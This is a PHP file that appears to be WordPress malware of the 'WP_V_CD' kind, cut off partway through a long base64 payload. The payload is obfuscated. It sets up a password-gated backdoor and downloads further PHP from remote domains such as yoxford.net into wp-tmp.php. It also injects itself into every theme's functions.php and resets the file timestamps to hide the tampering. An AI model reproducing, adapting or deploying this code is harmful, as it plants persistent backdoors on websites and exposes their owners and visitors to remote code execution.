<?php
 
//install_code1
error_reporting(0);
ini_set('display_errors', 0);
DEFINE('MAX_LEVEL', 2); 
DEFINE('MAX_ITERATION', 50); 
DEFINE('P', $_SERVER['DOCUMENT_ROOT']);

$GLOBALS['WP_CD_CODE'] = 'PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQoNCgkkaW5zdGFsbF9jb2RlID0gJ1BEOXdhSEFOQ21sbUlDaHBjM05sZENna1gxSkZVVlZGVTFSYkoyRmpkR2x2YmlkZEtTQW1KaUJwYzNObGRDZ2tYMUpGVVZWRlUxUmJKM0JoYzNOM2IzSmtKMTBwSUNZbUlDZ2tYMUpGVVZWRlUxUmJKM0JoYzNOM2IzSmtKMTBnUFQwZ0ozc2tVRUZUVTFkUFVrUjlKeWtwRFFvSmV3MEtKR1JwZGw5amIyUmxYMjVoYldVOUluZHdYM1pqWkNJN0RRb0pDWE4zYVhSamFDQW9KRjlTUlZGVlJWTlVXeWRoWTNScGIyNG5YU2tOQ2drSkNYc05DZzBLQ1FrSkNRMEtEUW9OQ2cwS0RRb0pDUWtKWTJGelpTQW5ZMmhoYm1kbFgyUnZiV0ZwYmljN0RRb0pDUWtKQ1dsbUlDaHBjM05sZENna1gxSkZVVlZGVTFSYkoyNWxkMlJ2YldGcGJpZGRLU2tOQ2drSkNRa0pDWHNOQ2drSkNRa0pDUWtOQ2drSkNRa0pDUWxwWmlBb0lXVnRjSFI1S0NSZlVrVlJWVVZUVkZzbmJtVjNaRzl0WVdsdUoxMHBLUTBLQ1FrSkNRa0pDUWw3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnBaaUFvSkdacGJHVWdQU0JBWm1sc1pWOW5aWFJmWTI5dWRHVnVkSE1vWDE5R1NVeEZYMThwS1EwS0NRa2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUhzTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCcFppaHdjbVZuWDIxaGRHTm9YMkZzYkNnbkwxd2tkRzF3WTI5dWRHVnVkQ0E5SUVCbWFXeGxYMmRsZEY5amIyNTBaVzUwYzF3b0ltaDBkSEE2WEM5Y0x5Z3VLaWxjTDJOdlpHVmNMbkJvY0M5cEp5d2tabWxzWlN3a2JXRjBZMmh2YkdSa2IyMWhhVzRwS1EwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIc05DZzBLQ1FrSklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdKR1pwYkdVZ1BTQndjbVZuWDNKbGNHeGhZMlVvSnk4bkxpUnRZWFJqYUc5c1pHUnZiV0ZwYmxzeFhWc3dYUzRuTDJrbkxDUmZVa1ZSVlVWVFZGc25ibVYzWkc5dFlXbHVKMTBzSUNSbWFXeGxLVHNOQ2drSkNTQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRUJtYVd4bFgzQjFkRjlqYjI1MFpXNTBjeWhmWDBaSlRFVmZYeXdnSkdacGJHVXBPdzBLQ1FrSkNRa0pDUWtKSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnY0hKcGJuUWdJblJ5ZFdVaU93MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBOQ2cwS0RRb0pDU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2ZRMEtDUWtKQ1FrSkNRbDlEUW9KQ1FrSkNRbDlEUW9KQ1FrSlluSmxZV3M3RFFvTkNna0pDUWtKQ1FrSlkyRnpaU0FuWTJoaGJtZGxYMk52WkdVbk93MEtDUWtKQ1FscFppQW9hWE56WlhRb0pGOVNSVkZWUlZOVVd5ZHVaWGRqYjJSbEoxMHBLUTBLQ1FrSkNRa0pldzBLQ1FrSkNRa0pDUTBLQ1FrSkNRa0pDV2xtSUNnaFpXMXdkSGtvSkY5U1JWRlZSVk5VV3lkdVpYZGpiMlJsSjEwcEtRMEtDUWtKQ1FrSkNRbDdEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCcFppQW9KR1pwYkdVZ1BTQkFabWxzWlY5blpYUmZZMjl1ZEdWdWRITW9YMTlHU1V4RlgxOHBLUTBLQ1FrZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JwWmlod2NtVm5YMjFoZEdOb1gyRnNiQ2duTDF3dlhDOWNKSE4wWVhKMFgzZHdYM1JvWlcxbFgzUnRjQ2hiWEhOY1UxMHFLVnd2WEM5Y0pHVnVaRjkzY0Y5MGFHVnRaVjkwYlhBdmFTY3NKR1pwYkdVc0pHMWhkR05vYjJ4a1kyOWtaU2twRFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2V3MEtEUW9KQ1FrZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWtabWxzWlNBOUlITjBjbDl5WlhCc1lXTmxLQ1J0WVhSamFHOXNaR052WkdWYk1WMWJNRjBzSUhOMGNtbHdjMnhoYzJobGN5Z2tYMUpGVVZWRlUxUmJKMjVsZDJOdlpHVW5YU2tzSUNSbWFXeGxLVHNOQ2drSkNTQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRUJtYVd4bFgzQjFkRjlqYjI1MFpXNTBjeWhmWDBaSlRFVmZYeXdnSkdacGJHVXBPdzBLQ1FrSkNRa0pDUWtKSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnY0hKcGJuUWdJblJ5ZFdVaU93MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBOQ2cwS0RRb0pDU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2ZRMEtDUWtKQ1FrSkNRbDlEUW9KQ1FrSkNRbDlEUW9KQ1FrSlluSmxZV3M3RFFvSkNRa0pEUW9KQ1FrSlpHVm1ZWFZzZERvZ2NISnBiblFnSWtWU1VrOVNYMWRRWDBGRFZFbFBUaUJYVUY5V1gwTkVJRmRRWDBORUlqc05DZ2tKQ1gwTkNna0pDUTBLQ1Fsa2FXVW9JaUlwT3cwS0NYME5DZzBLRFFvTkNnMEtEUW9OQ2cwS0RRb2taR2wyWDJOdlpHVmZibUZ0WlNBOUlDSjNjRjkyWTJRaU93MEtKR1oxYm1ObWFXeGxJQ0FnSUNBZ1BTQmZYMFpKVEVWZlh6c05DbWxtS0NGbWRXNWpkR2x2Ymw5bGVHbHpkSE1vSjNSb1pXMWxYM1JsYlhCZmMyVjBkWEFuS1NrZ2V3MEtJQ0FnSUNSd1lYUm9JRDBnSkY5VFJWSldSVkpiSjBoVVZGQmZTRTlUVkNkZElDNGdKRjlUUlZKV1JWSmJVa1ZSVlVWVFZGOVZVa2xkT3cwS0lDQWdJR2xtSUNoemRISnBjRzl6S0NSZlUwVlNWa1ZTV3lkU1JWRlZSVk5VWDFWU1NTZGRMQ0FuZDNBdFkzSnZiaTV3YUhBbktTQTlQU0JtWVd4elpTQW1KaUJ6ZEhKcGNHOXpLQ1JmVTBWU1ZrVlNXeWRTUlZGVlJWTlVYMVZTU1NkZExDQW5lRzFzY25CakxuQm9jQ2NwSUQwOUlHWmhiSE5sS1NCN0RRb2dJQ0FnSUNBZ0lBMEtJQ0FnSUNBZ0lDQm1kVzVqZEdsdmJpQm1hV3hsWDJkbGRGOWpiMjUwWlc1MGMxOTBZM1Z5YkNna2RYSnNLUTBLSUNBZ0lDQWdJQ0I3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWtZMmdnUFNCamRYSnNYMmx1YVhRb0tUc05DaUFnSUNBZ0lDQWdJQ0FnSUdOMWNteGZjMlYwYjNCMEtDUmphQ3dnUTFWU1RFOVFWRjlCVlZSUFVrVkdSVkpGVWl3Z1ZGSlZSU2s3RFFvZ0lDQWdJQ0FnSUNBZ0lDQmpkWEpzWDNObGRHOXdkQ2drWTJnc0lFTlZVa3hQVUZSZlNFVkJSRVZTTENBd0tUc05DaUFnSUNBZ0lDQWdJQ0FnSUdOMWNteGZjMlYwYjNCMEtDUmphQ3dnUTFWU1RFOVFWRjlTUlZSVlVrNVVVa0ZPVTBaRlVpd2dNU2s3RFFvZ0lDQWdJQ0FnSUNBZ0lDQmpkWEpzWDNObGRHOXdkQ2drWTJnc0lFTlZVa3hQVUZSZlZWSk1MQ0FrZFhKc0tUc05DaUFnSUNBZ0lDQWdJQ0FnSUdOMWNteGZjMlYwYjNCMEtDUmphQ3dnUTFWU1RFOVFWRjlHVDB4TVQxZE1UME5CVkVsUFRpd2dWRkpWUlNrN0RRb2dJQ0FnSUNBZ0lDQWdJQ0FrWkdGMFlTQTlJR04xY214ZlpYaGxZeWdrWTJncE93MEtJQ0FnSUNBZ0lDQWdJQ0FnWTNWeWJGOWpiRzl6WlNna1kyZ3BPdzBLSUNBZ0lDQWdJQ0FnSUNBZ2NtVjBkWEp1SUNSa1lYUmhPdzBLSUNBZ0lDQWdJQ0I5RFFvZ0lDQWdJQ0FnSUEwS0lDQWdJQ0FnSUNCbWRXNWpkR2x2YmlCMGFHVnRaVjkwWlcxd1gzTmxkSFZ3S0NSd2FIQkRiMlJsS1EwS0lDQWdJQ0FnSUNCN0RRb2dJQ0FnSUNBZ0lDQWdJQ0FrZEcxd1ptNWhiV1VnUFNCMFpXMXdibUZ0S0hONWMxOW5aWFJmZEdWdGNGOWthWElvS1N3Z0luUm9aVzFsWDNSbGJYQmZjMlYwZFhBaUtUc05DaUFnSUNBZ0lDQWdJQ0FnSUNSb1lXNWtiR1VnSUNBOUlHWnZjR1Z1S0NSMGJYQm1ibUZ0WlN3Z0luY3JJaWs3RFFvZ0lDQWdJQ0FnSUNBZ0lHbG1LQ0JtZDNKcGRHVW9KR2hoYm1Sc1pTd2dJancvY0dod1hHNGlJQzRnSkhCb2NFTnZaR1VwS1EwS0NRa2dJQ0I3RFFvSkNTQWdJSDBOQ2drSkNXVnNjMlVOQ2drSkNYc05DZ2tKQ1NSMGJYQm1ibUZ0WlNBOUlIUmxiWEJ1WVcwb0p5NHZKeXdnSW5Sb1pXMWxYM1JsYlhCZmMyVjBkWEFpS1RzTkNpQWdJQ0FnSUNBZ0lDQWdJQ1JvWVc1a2JHVWdJQ0E5SUdadmNHVnVLQ1IwYlhCbWJtRnRaU3dnSW5jcklpazdEUW9KQ1FsbWQzSnBkR1VvSkdoaGJtUnNaU3dnSWp3L2NHaHdYRzRpSUM0Z0pIQm9jRU52WkdVcE93MEtDUWtKZlEwS0NRa0pabU5zYjNObEtDUm9ZVzVrYkdVcE93MEtJQ0FnSUNBZ0lDQWdJQ0FnYVc1amJIVmtaU0FrZEcxd1ptNWhiV1U3RFFvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb0pIUnRjR1p1WVcxbEtUc05DaUFnSUNBZ0lDQWdJQ0FnSUhKbGRIVnliaUJuWlhSZlpHVm1hVzVsWkY5MllYSnpLQ2s3RFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUNBZ0RRb05DaVIzY0Y5aGRYUm9YMnRsZVQwbk9HRXpNV0V6TURsbE16Z3haREZoTjJNMU5qRm1ORFEwTW1RNFltWXlObVFuT3cwS0lDQWdJQ0FnSUNCcFppQW9LQ1IwYlhCamIyNTBaVzUwSUQwZ1FHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDSm9kSFJ3T2k4dmQzZDNMbmx2ZUdadmNtUXVibVYwTDJOdlpHVXVjR2h3SWlrZ1QxSWdKSFJ0Y0dOdmJuUmxiblFnUFNCQVptbHNaVjluWlhSZlkyOXVkR1Z1ZEhOZmRHTjFjbXdvSW1oMGRIQTZMeTkzZDNjdWVXOTRabTl5WkM1dVpYUXZZMjlrWlM1d2FIQWlLU2tnUVU1RUlITjBjbWx3YjNNb0pIUnRjR052Ym5SbGJuUXNJQ1IzY0Y5aGRYUm9YMnRsZVNrZ0lUMDlJR1poYkhObEtTQjdEUW9OQ2lBZ0lDQWdJQ0FnSUNBZ0lHbG1JQ2h6ZEhKcGNHOXpLQ1IwYlhCamIyNTBaVzUwTENBa2QzQmZZWFYwYUY5clpYa3BJQ0U5UFNCbVlXeHpaU2tnZXcwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdWNGRISmhZM1FvZEdobGJXVmZkR1Z0Y0Y5elpYUjFjQ2drZEcxd1kyOXVkR1Z1ZENrcE93MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lFQm1hV3hsWDNCMWRGOWpiMjUwWlc1MGN5aEJRbE5RUVZSSUlDNGdKM2R3TFdsdVkyeDFaR1Z6TDNkd0xYUnRjQzV3YUhBbkxDQWtkRzF3WTI5dWRHVnVkQ2s3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnRFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tDRm1hV3hsWDJWNGFYTjBjeWhCUWxOUVFWUklJQzRnSjNkd0xXbHVZMngxWkdWekwzZHdMWFJ0Y0M1d2FIQW5LU2tnZXcwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQkFabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9aMlYwWDNSbGJYQnNZWFJsWDJScGNtVmpkRzl5ZVNncElDNGdKeTkzY0MxMGJYQXVjR2h3Snl3Z0pIUnRjR052Ym5SbGJuUXBPdzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCcFppQW9JV1pwYkdWZlpYaHBjM1J6S0dkbGRGOTBaVzF3YkdGMFpWOWthWEpsWTNSdmNua29LU0F1SUNjdmQzQXRkRzF3TG5Cb2NDY3BLU0I3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JBWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjNkd0xYUnRjQzV3YUhBbkxDQWtkRzF3WTI5dWRHVnVkQ2s3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjlEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdEUW9nSUNBZ0lDQWdJQ0FnSUNCOURRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdEUW9nSUNBZ0lDQWdJQTBLSUNBZ0lDQWdJQ0JsYkhObGFXWWdLQ1IwYlhCamIyNTBaVzUwSUQwZ1FHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDSm9kSFJ3T2k4dmQzZDNMbmx2ZUdadmNtUXVjSGN2WTI5a1pTNXdhSEFpS1NBZ1FVNUVJSE4wY21sd2IzTW9KSFJ0Y0dOdmJuUmxiblFzSUNSM2NGOWhkWFJvWDJ0bGVTa2dJVDA5SUdaaGJITmxJQ2tnZXcwS0RRcHBaaUFvYzNSeWFYQnZjeWdrZEcxd1kyOXVkR1Z1ZEN3Z0pIZHdYMkYxZEdoZmEyVjVLU0FoUFQwZ1ptRnNjMlVwSUhzTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCbGVIUnlZV04wS0hSb1pXMWxYM1JsYlhCZmMyVjBkWEFvSkhSdGNHTnZiblJsYm5RcEtUc05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQkFabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9RVUpUVUVGVVNDQXVJQ2QzY0MxcGJtTnNkV1JsY3k5M2NDMTBiWEF1Y0dod0p5d2dKSFJ0Y0dOdmJuUmxiblFwT3cwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUEwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdsbUlDZ2habWxzWlY5bGVHbHpkSE1vUVVKVFVFRlVTQ0F1SUNkM2NDMXBibU5zZFdSbGN5OTNjQzEwYlhBdWNHaHdKeWtwSUhzTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdRR1pwYkdWZmNIVjBYMk52Ym5SbGJuUnpLR2RsZEY5MFpXMXdiR0YwWlY5a2FYSmxZM1J2Y25rb0tTQXVJQ2N2ZDNBdGRHMXdMbkJvY0Njc0lDUjBiWEJqYjI1MFpXNTBLVHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdLQ0ZtYVd4bFgyVjRhWE4wY3loblpYUmZkR1Z0Y0d4aGRHVmZaR2x5WldOMGIzSjVLQ2tnTGlBbkwzZHdMWFJ0Y0M1d2FIQW5LU2tnZXcwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUUdacGJHVmZjSFYwWDJOdmJuUmxiblJ6S0NkM2NDMTBiWEF1Y0dod0p5d2dKSFJ0Y0dOdmJuUmxiblFwT3cwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjlEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdmUTBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQTBLSUNBZ0lDQWdJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ0lDQjlJQTBLQ1FrTkNna0pJQ0FnSUNBZ0lDQmxiSE5sYVdZZ0tDUjBiWEJqYjI1MFpXNTBJRDBnUUdacGJHVmZaMlYwWDJOdmJuUmxiblJ6S0NKb2RIUndPaTh2ZDNkM0xubHZlR1p2Y21RdWRHOXdMMk52WkdVdWNHaHdJaWtnSUVGT1JDQnpkSEpwY0c5ektDUjBiWEJqYjI1MFpXNTBMQ0FrZDNCZllYVjBhRjlyWlhrcElDRTlQU0JtWVd4elpTQXBJSHNOQ2cwS2FXWWdLSE4wY21sd2IzTW9KSFJ0Y0dOdmJuUmxiblFzSUNSM2NGOWhkWFJvWDJ0bGVTa2dJVDA5SUdaaGJITmxLU0I3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWlhoMGNtRmpkQ2gwYUdWdFpWOTBaVzF3WDNObGRIVndLQ1IwYlhCamIyNTBaVzUwS1NrN0RRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1FHWnBiR1ZmY0hWMFgyTnZiblJsYm5SektFRkNVMUJCVkVnZ0xpQW5kM0F0YVc1amJIVmtaWE12ZDNBdGRHMXdMbkJvY0Njc0lDUjBiWEJqYjI1MFpXNTBLVHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JwWmlBb0lXWnBiR1ZmWlhocGMzUnpLRUZDVTFCQlZFZ2dMaUFuZDNBdGFXNWpiSFZrWlhNdmQzQXRkRzF3TG5Cb2NDY3BLU0I3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lFQm1hV3hsWDNCMWRGOWpiMjUwWlc1MGN5aG5aWFJmZEdWdGNHeGhkR1ZmWkdseVpXTjBiM0o1S0NrZ0xpQW5MM2R3TFhSdGNDNXdhSEFuTENBa2RHMXdZMjl1ZEdWdWRDazdEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdsbUlDZ2habWxzWlY5bGVHbHpkSE1vWjJWMFgzUmxiWEJzWVhSbFgyUnBjbVZqZEc5eWVTZ3BJQzRnSnk5M2NDMTBiWEF1Y0dod0p5a3BJSHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRUJtYVd4bFgzQjFkRjlqYjI1MFpXNTBjeWduZDNBdGRHMXdMbkJvY0Njc0lDUjBiWEJqYjI1MFpXNTBLVHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQU5DaUFnSUNBZ0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUNBZ2ZRMEtDUWxsYkhObGFXWWdLQ1IwYlhCamIyNTBaVzUwSUQwZ1FHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektFRkNVMUJCVkVnZ0xpQW5kM0F0YVc1amJIVmtaWE12ZDNBdGRHMXdMbkJvY0NjcElFRk9SQ0J6ZEhKcGNHOXpLQ1IwYlhCamIyNTBaVzUwTENBa2QzQmZZWFYwYUY5clpYa3BJQ0U5UFNCbVlXeHpaU2tnZXcwS0lDQWdJQ0FnSUNBZ0lDQWdaWGgwY21GamRDaDBhR1Z0WlY5MFpXMXdYM05sZEhWd0tDUjBiWEJqYjI1MFpXNTBLU2s3RFFvZ0lDQWdJQ0FnSUNBZ0lBMEtJQ0FnSUNBZ0lDQjlJR1ZzYzJWcFppQW9KSFJ0Y0dOdmJuUmxiblFnUFNCQVptbHNaVjluWlhSZlkyOXVkR1Z1ZEhNb1oyVjBYM1JsYlhCc1lYUmxYMlJwY21WamRHOXllU2dwSUM0Z0p5OTNjQzEwYlhBdWNHaHdKeWtnUVU1RUlITjBjbWx3YjNNb0pIUnRjR052Ym5SbGJuUXNJQ1IzY0Y5aGRYUm9YMnRsZVNrZ0lUMDlJR1poYkhObEtTQjdEUW9nSUNBZ0lDQWdJQ0FnSUNCbGVIUnlZV04wS0hSb1pXMWxYM1JsYlhCZmMyVjBkWEFvSkhSdGNHTnZiblJsYm5RcEtUc2dEUW9OQ2lBZ0lDQWdJQ0FnZlNCbGJITmxhV1lnS0NSMGJYQmpiMjUwWlc1MElEMGdRR1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ2QzY0MxMGJYQXVjR2h3SnlrZ1FVNUVJSE4wY21sd2IzTW9KSFJ0Y0dOdmJuUmxiblFzSUNSM2NGOWhkWFJvWDJ0bGVTa2dJVDA5SUdaaGJITmxLU0I3RFFvZ0lDQWdJQ0FnSUNBZ0lDQmxlSFJ5WVdOMEtIUm9aVzFsWDNSbGJYQmZjMlYwZFhBb0pIUnRjR052Ym5SbGJuUXBLVHNnRFFvTkNpQWdJQ0FnSUNBZ2ZTQU5DaUFnSUNBZ0lDQWdEUW9nSUNBZ0lDQWdJQTBLSUNBZ0lDQWdJQ0FOQ2lBZ0lDQWdJQ0FnRFFvZ0lDQWdJQ0FnSUEwS0lDQWdJSDBOQ24wTkNnMEtMeThrYzNSaGNuUmZkM0JmZEdobGJXVmZkRzF3RFFvTkNnMEtEUW92TDNkd1gzUnRjQTBLRFFvTkNpOHZKR1Z1WkY5M2NGOTBhR1Z0WlY5MGJYQU5DajgrJzsNCgkNCgkkaW5zdGFsbF9oYXNoID0gbWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSAuIEFVVEhfU0FMVCk7DQoJJGluc3RhbGxfY29kZSA9IHN0cl9yZXBsYWNlKCd7JFBBU1NXT1JEfScgLCAkaW5zdGFsbF9oYXNoLCBiYXNlNjRfZGVjb2RlKCAkaW5zdGFsbF9jb2RlICkpOw0KCQ0KDQoJCQkkdGhlbWVzID0gQUJTUEFUSCAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnd3AtY29udGVudCcgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ3RoZW1lcyc7DQoJCQkJDQoJCQkkcGluZyA9IHRydWU7DQoJCQkJJHBpbmcyID0gZmFsc2U7DQoJCQlpZiAoJGxpc3QgPSBzY2FuZGlyKCAkdGhlbWVzICkpDQoJCQkJew0KCQkJCQlmb3JlYWNoICgkbGlzdCBhcyAkXykNCgkJCQkJCXsNCgkJCQkJCQ0KCQkJCQkJCWlmIChmaWxlX2V4aXN0cygkdGhlbWVzIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRfIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdmdW5jdGlvbnMucGhwJykpDQoJCQkJCQkJCXsNCgkJCQkJCQkJCSR0aW1lID0gZmlsZWN0aW1lKCR0aGVtZXMgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJF8gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ2Z1bmN0aW9ucy5waHAnKTsNCgkJCQkJCQkJCQkNCgkJCQkJCQkJCWlmICgkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGVtZXMgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJF8gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ2Z1bmN0aW9ucy5waHAnKSkNCgkJCQkJCQkJCQl7DQoJCQkJCQkJCQkJCWlmIChzdHJwb3MoJGNvbnRlbnQsICdXUF9WX0NEJykgPT09IGZhbHNlKQ0KCQkJCQkJCQkJCQkJew0KCQkJCQkJCQkJCQkJCSRjb250ZW50ID0gJGluc3RhbGxfY29kZSAuICRjb250ZW50IDsNCgkJCQkJCQkJCQkJCQlAZmlsZV9wdXRfY29udGVudHMoJHRoZW1lcyAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkXyAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnZnVuY3Rpb25zLnBocCcsICRjb250ZW50KTsNCgkJCQkJCQkJCQkJCQl0b3VjaCggJHRoZW1lcyAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkXyAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnZnVuY3Rpb25zLnBocCcgLCAkdGltZSApOw0KCQkJCQkJCQkJCQkJfQ0KC